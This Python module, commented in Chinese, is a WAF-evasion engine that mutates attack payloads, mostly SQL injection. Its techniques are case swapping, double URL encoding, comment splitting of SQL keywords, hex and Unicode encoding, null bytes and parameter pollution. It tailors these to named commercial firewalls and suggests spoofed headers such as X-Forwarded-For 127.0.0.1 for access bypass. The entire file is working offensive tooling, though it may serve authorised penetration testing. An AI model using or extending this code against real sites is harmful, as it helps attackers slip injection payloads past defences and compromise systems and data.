#!/usr/bin/env python3
"""
Payload 变异器模块 - 统一的 WAF 绕过变异引擎

整合自:
- smart_payload_engine.py: PayloadMutator 类 (lines 613-814)
- adaptive_payload_engine.py: mutate_payload 方法 (lines 256-282)

消除了两个文件中的重复变异方法实现
"""

import logging
import random
import re
import urllib.parse
from enum import Enum
from typing import Any, Dict, List, Optional

from .signatures import WAF_BYPASS_STRATEGIES

logger = logging.getLogger(__name__)


class MutationType(Enum):
    """变异方法枚举"""

    CASE_SWAP = "case"
    URL_ENCODE = "url_encode"
    DOUBLE_URL = "double_url"
    COMMENT_SPLIT = "comment_split"
    UNICODE = "unicode"
    HEX = "hex"
    CONCAT = "concat"
    WHITESPACE = "whitespace"
    NEWLINE = "newline"
    NULL_BYTE = "null_byte"
    HPP = "hpp"  # HTTP Parameter Pollution


# 变异方法描述
MUTATION_DESCRIPTIONS: Dict[str, str] = {
    "case": "大小写混淆",
    "url_encode": "URL编码",
    "double_url": "双重URL编码",
    "comment_split": "注释分割",
    "unicode": "Unicode编码",
    "hex": "十六进制编码",
    "concat": "字符串拼接",
    "whitespace": "空白符替换",
    "newline": "换行符注入",
    "null_byte": "空字节注入",
    "hpp": "HTTP参数污染",
}

# WAF 特定绕过策略
WAF_MUTATION_STRATEGIES: Dict[str, List[str]] = {
    "cloudflare": ["double_url", "unicode", "comment_split", "case"],
    "aws_waf": ["case", "whitespace", "concat", "double_url", "hpp"],
    "modsecurity": ["comment_split", "hex", "double_url", "newline", "null_byte"],
    "imperva": ["unicode", "case", "whitespace", "concat"],
    "akamai": ["double_url", "unicode", "comment_split"],
    "f5_bigip": ["case", "url_encode", "whitespace"],
    "default": ["case", "url_encode", "comment_split"],
}


class PayloadMutator:
    """
    Payload 变异器 - 统一的 WAF 绕过引擎

    支持多种编码和混淆技术，可根据检测到的 WAF 类型
    自动选择最优绕过策略
    """

    # SQL 关键字列表（用于注释分割）
    SQL_KEYWORDS = [
        "SELECT",
        "UNION",
        "FROM",
        "WHERE",
        "AND",
        "OR",
        "INSERT",
        "UPDATE",
        "DELETE",
        "DROP",
        "CREATE",
        "ORDER",
        "GROUP",
        "HAVING",
        "LIMIT",
        "OFFSET",
    ]

    # Unicode 特殊字符映射
    UNICODE_MAP = {
        "'": "\\u0027",
        '"': "\\u0022",
        "<": "\\u003c",
        ">": "\\u003e",
        "/": "\\u002f",
        "\\": "\\u005c",
    }

    # 空白符替代方案
    WHITESPACE_ALTERNATIVES = ["%09", "%0a", "%0d", "/**/", "+", "%20"]

    @classmethod
    def mutate(
        cls,
        payload: str,
        waf: Optional[str] = None,
        mutations: Optional[List[str]] = None,
        include_original: bool = True,
    ) -> List[str]:
        """
        对 Payload 进行变异

        Args:
            payload: 原始 Payload
            waf: 检测到的 WAF 类型
            mutations: 指定变异方法列表
            include_original: 是否包含原始 Payload

        Returns:
            变异后的 Payload 列表（已去重）
        """
        results = []
        if include_original:
            results.append(payload)

        # 确定使用的变异方法
        if mutations:
            methods = mutations
        elif waf:
            waf_lower = waf.lower()
            methods = WAF_MUTATION_STRATEGIES.get(waf_lower, WAF_MUTATION_STRATEGIES["default"])
        else:
            methods = list(MUTATION_DESCRIPTIONS.keys())

        for method in methods:
            try:
                mutated = cls._apply_mutation(payload, method)
                if mutated and mutated != payload and mutated not in results:
                    results.append(mutated)
            except Exception as e:
                logger.debug(f"Mutation {method} failed: {e}")
                continue

        return results

    @classmethod
    def _apply_mutation(cls, payload: str, method: str) -> str:
        """
        应用单个变异方法

        Args:
            payload: 原始 Payload
            method: 变异方法名称

        Returns:
            变异后的 Payload
        """
        mutation_map = {
            "case": cls._case_swap,
            "url_encode": cls._url_encode,
            "double_url": cls._double_url_encode,
            "comment_split": cls._comment_split,
            "unicode": cls._unicode_encode,
            "hex": cls._hex_encode,
            "concat": cls._concat_split,
            "whitespace": cls._whitespace_replace,
            "newline": cls._newline_inject,
            "null_byte": cls._null_byte_inject,
            "hpp": cls._hpp_mutate,
        }

        func = mutation_map.get(method)
        if func:
            return func(payload)
        return payload

    @classmethod
    def _case_swap(cls, payload: str) -> str:
        """
        大小写混淆: SELECT -> SeLeCt

        交替大小写，绕过大小写敏感的过滤器
        """
        result = []
        for i, c in enumerate(payload):
            if c.isalpha():
                result.append(c.upper() if i % 2 == 0 else c.lower())
            else:
                result.append(c)
        return "".join(result)

    @classmethod
    def _url_encode(cls, payload: str) -> str:
        """
        URL 编码关键字符

        编码 ' " > < ; | & 等特殊字符
        """
        chars_to_encode = "'\"><;|&"
        result = payload
        for c in chars_to_encode:
            result = result.replace(c, urllib.parse.quote(c))
        return result

    @classmethod
    def _double_url_encode(cls, payload: str) -> str:
        """
        双重 URL 编码

        ' -> %27 -> %2527
        """
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    @classmethod
    def _comment_split(cls, payload: str) -> str:
        """
        SQL 注释分割: UNION -> UN/**/ION

        在 SQL 关键字中间插入注释，绕过关键字检测
        """
        result = payload
        for kw in cls.SQL_KEYWORDS:
            if kw.lower() in result.lower():
                mid = len(kw) // 2
                replacement = kw[:mid] + "/**/" + kw[mid:]
                result = re.sub(kw, replacement, result, flags=re.IGNORECASE)
        return result

    @classmethod
    def _unicode_encode(cls, payload: str) -> str:
        """
        Unicode 编码: ' -> \\u0027

        将特殊字符转换为 Unicode 转义序列
        """
        result = payload
        for char, unicode_repr in cls.UNICODE_MAP.items():
            result = result.replace(char, unicode_repr)
        return result

    @classmethod
    def _hex_encode(cls, payload: str) -> str:
        """
        十六进制编码: admin -> 0x61646d696e

        将字母单词转换为十六进制表示
        """
        words = re.findall(r"\b[a-zA-Z]+\b", payload)
        result = payload
        for word in words[:2]:  # 只编码前两个单词，避免过度混淆
            hex_val = "0x" + word.encode().hex()
            result = result.replace(word, hex_val, 1)
        return result

    @classmethod
    def _concat_split(cls, payload: str) -> str:
        """
        字符串拼接: 'admin' -> 'ad'||'min'

        将字符串拆分并用 SQL 拼接运算符连接
        """
        strings = re.findall(r"'([^']+)'", payload)
        result = payload
        for s in strings:
            if len(s) > 3:
                mid = len(s) // 2
                concat_str = f"'{s[:mid]}'||'{s[mid:]}'"
                result = result.replace(f"'{s}'", concat_str, 1)
        return result

    @classmethod
    def _whitespace_replace(cls, payload: str) -> str:
        """
        空白符替换: 空格 -> %09 或 /**/

        随机选择空白符替代方案
        """
        replacement = random.choice(cls.WHITESPACE_ALTERNATIVES)
        return payload.replace(" ", replacement)

    @classmethod
    def _newline_inject(cls, payload: str) -> str:
        """
        换行符注入

        在关键位置插入换行符，绕过单行模式的过滤
        """
        # 在 SQL 关键字前插入换行
        for kw in ["SELECT", "UNION", "FROM", "WHERE"]:
            if kw.lower() in payload.lower():
                payload = re.sub(f"({kw})", r"%0a\1", payload, flags=re.IGNORECASE)
        return payload

    @classmethod
    def _null_byte_inject(cls, payload: str) -> str:
        """
        空字节注入

        在 Payload 末尾添加空字节，可能截断后续处理
        """
        return payload + "%00"

    @classmethod
    def _hpp_mutate(cls, payload: str) -> str:
        """
        HTTP 参数污染变体

        用于构造参数污染的 Payload 变体
        """
        # 如果 Payload 是参数值，添加重复参数的标记
        if "=" not in payload and "&" not in payload:
            return f"{payload}&"
        return payload

    @classmethod
    def generate_variants(
        cls,
        payload: str,
        waf: Optional[str] = None,
        count: int = 10,
    ) -> List[Dict[str, str]]:
        """
        生成多个变体

        Args:
            payload: 原始 Payload
            waf: WAF 类型
            count: 生成数量

        Returns:
            [{"payload": ..., "mutation": ..., "description": ...}, ...]
        """
        variants = []
        seen = {payload}  # 跟踪已生成的变体

        # 单一变异
        for method in MUTATION_DESCRIPTIONS.keys():
            if len(variants) >= count:
                break
            try:
                mutated = cls._apply_mutation(payload, method)
                if mutated not in seen:
                    seen.add(mutated)
                    variants.append(
                        {
                            "payload": mutated,
                            "mutation": method,
                            "description": MUTATION_DESCRIPTIONS.get(method, method),
                        }
                    )
            except (TypeError, ValueError, UnicodeError):
                continue

        # 组合变异（如果单一变异数量不足）
        if len(variants) < count:
            methods = list(MUTATION_DESCRIPTIONS.keys())
            for i, m1 in enumerate(methods[: len(methods) // 2]):
                for m2 in methods[len(methods) // 2 :]:
                    if len(variants) >= count:
                        break
                    try:
                        p1 = cls._apply_mutation(payload, m1)
                        p2 = cls._apply_mutation(p1, m2)
                        if p2 not in seen:
                            seen.add(p2)
                            variants.append(
                                {
                                    "payload": p2,
                                    "mutation": f"{m1}+{m2}",
                                    "description": f"{MUTATION_DESCRIPTIONS.get(m1, m1)} + {MUTATION_DESCRIPTIONS.get(m2, m2)}",
                                }
                            )
                    except (TypeError, ValueError, UnicodeError):
                        continue
                if len(variants) >= count:
                    break

        return variants[:count]

    @classmethod
    def get_waf_strategies(cls, waf: str) -> Dict[str, Any]:
        """
        获取特定 WAF 的绕过策略

        Args:
            waf: WAF 类型

        Returns:
            包含绕过技术和推荐方法的字典
        """
        waf_lower = waf.lower() if waf else "default"

        mutations = WAF_MUTATION_STRATEGIES.get(waf_lower, WAF_MUTATION_STRATEGIES["default"])
        bypass_info = WAF_BYPASS_STRATEGIES.get(waf_lower, WAF_BYPASS_STRATEGIES.get("default", {}))

        return {
            "waf": waf,
            "mutations": mutations,
            "mutation_descriptions": [MUTATION_DESCRIPTIONS.get(m, m) for m in mutations],
            "difficulty": bypass_info.get("difficulty", "unknown"),
            "specific_payloads": bypass_info.get("specific_payloads", []),
        }


# ============== 便捷函数 ==============


def mutate_payload(
    payload: str,
    waf: Optional[str] = None,
    count: int = 10,
) -> Dict[str, Any]:
    """
    便捷函数: 变异 Payload

    Args:
        payload: 原始 Payload
        waf: WAF 类型
        count: 生成变体数量

    Returns:
        变异结果字典
    """
    variants = PayloadMutator.generate_variants(payload, waf, count=count)
    return {
        "original": payload,
        "waf": waf or "unknown",
        "variants_count": len(variants),
        "variants": variants,
    }


def mutate_for_waf(payload: str, waf: str) -> List[str]:
    """
    WAF 绕过变异（便捷函数）

    Args:
        payload: 原始 Payload
        waf: WAF 类型

    Returns:
        变异后的 Payload 列表
    """
    return PayloadMutator.mutate(payload, waf=waf, include_original=False)


def get_waf_bypass_variants(
    payload: str,
    waf: str,
    include_headers: bool = False,
) -> Dict[str, Any]:
    """
    获取完整的 WAF 绕过方案

    Args:
        payload: 原始 Payload
        waf: WAF 类型
        include_headers: 是否包含 Header 绕过建议

    Returns:
        包含变体和绕过策略的字典
    """
    variants = PayloadMutator.generate_variants(payload, waf, count=15)
    strategies = PayloadMutator.get_waf_strategies(waf)

    result = {
        "original": payload,
        "waf": waf,
        "variants": variants,
        "strategies": strategies,
    }

    if include_headers:
        # 添加 Header 绕过建议
        result["header_bypasses"] = [
            {"header": "X-Forwarded-For", "value": "127.0.0.1"},
            {"header": "X-Original-URL", "value": "/"},
            {"header": "X-Rewrite-URL", "value": "/"},
            {"header": "Content-Type", "value": "application/x-www-form-urlencoded; charset=utf-8"},
        ]

    return result
